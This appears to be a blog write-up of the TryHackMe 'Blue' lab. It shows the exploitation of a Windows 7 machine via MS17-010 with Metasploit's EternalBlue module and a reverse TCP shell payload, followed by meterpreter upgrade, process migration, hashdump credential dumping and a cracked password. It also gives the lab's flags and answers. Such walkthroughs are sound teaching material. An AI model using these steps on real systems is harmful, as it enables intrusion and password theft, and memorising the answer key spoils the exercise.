---
title: "[THM] Blue"
author: "Wook Lee"
date: "2024-07-25"
tags: ["TryHackMe"]
---

#### How many ports are open with a port number under 1000?

```
3
```

```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.10.75.102 --min-rate 3000 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 12:11 EDT
Nmap scan report for 10.10.75.102
Host is up (0.093s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2024-07-25T16:13:32+00:00
|_ssl-date: 2024-07-25T16:13:37+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2024-07-24T16:09:38
|_Not valid after:  2025-01-23T16:09:38
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

<br>

#### What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```
ms17-010
```

![alt text](image.png#center)

<br>

#### Start Metasploit

#### Find the exploitation code we will run against the machine. What is the full path of the code?

```
exploit/windows/smb/ms17_010_eternalblue
```

![alt text](image-1.png#center)

<br>

#### Show options and set the one required value. What is the name of this value? (All caps for submission)

```
RHOSTS
```

![alt text](image-2.png#center)

<br>

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

`set payload windows/x64/shell/reverse_tcp`.

![alt text](image-3.png#center)

<br>

With that done, run the exploit!

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL+Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

<br>

Successfully ran the exploit and captured the shell.
![alt text](image-4.png#center)

<br>

#### If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

```
post/multi/manage/shell_to_meterpreter
```

To convert a shell to Meterpreter shell in Metasploit, list all sessions by `sessions -l` and note the ID of the shell session you want to upgrade. Then upgrade the shell session to a Meterpreter session by `sessions -u <id>`.

![alt text](image-5.png#center)

<br>

#### Select this (use MODULE_PATH). Show options, what option are we required to change?

```
SESSION
```

![alt text](image-6.png#center)

<br>

#### once the meterpreter shell conversion completes, select that session for use.

![alt text](image-7.png#center)

<br>

#### Verify that we have escalated to NT AUTHORITY\SYSTEM. Run `getsystem` to confirm this. Feel free to open a dos shell via command `shell` and run `whoami`. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

<br>

#### List all of the processes running via the `ps` command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id.

```
716
```

![alt text](image-8.png#center)

<br>

#### Migrate to this process using the `migrate <process id>` command where the process id is the one you just wrote down in the previous step. This may take serveral attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again.

![alt text](image-9.png#center)

<br>

#### Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the password on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

```
Jon
```

![alt text](image-10.png#center)

<br>

#### Copy this password hash to a file and research how to crack it. What is the cracked password?

```
alqfna22
```

![alt text](image-11.png#center)

<br>

#### Flag1? This flag can be found at the system root.

```
flag{access_the_machine}
```

```shell
meterpreter > cd ..
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:36 -0500  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 18:22:01 -0400  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 18:28:38 -0400  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 18:35:57 -0400  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-12 22:13:22 -0500  Recovery
040777/rwxrwxrwx  4096   dir   2024-07-25 13:49:19 -0400  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-12 22:13:28 -0500  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 18:36:30 -0400  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 15:27:21 -0400  flag1.txt
000000/---------  0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
000000/---------  0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}
```

<br>

#### Flag2? This flag can be found at the location where passwords are stored within Windows.

\*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It maybe necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

```
flag{sam_database_elevated_access}
```

The SAM (Security Accounts Manager) database stores hashed passwords for local user accounts. It is part of the Windows registry and is loaded into memory during the system boot process. The hashes are stored and can be accessed with tools that have sufficient privileges.

Location: `C:\Windows\System32\config\SAM`

![alt text](image-12.png#center)

<br>

#### Flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.

```
flag{admin_documents_can_be_valuable}
```

![alt text](image-13.png#center)

```shell
meterpreter > cat c:/Users/Jon/Documents/flag3.txt
flag{admin_documents_can_be_valuable}
```

<br>
